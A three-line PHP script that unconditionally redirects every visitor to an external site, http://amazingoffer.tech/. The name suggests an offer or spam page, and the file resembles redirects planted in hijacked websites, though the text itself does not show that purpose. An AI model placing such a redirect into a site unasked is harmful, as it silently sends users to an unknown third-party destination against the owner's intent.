<?php
header('Location: http://amazingoffer.tech/');
?>
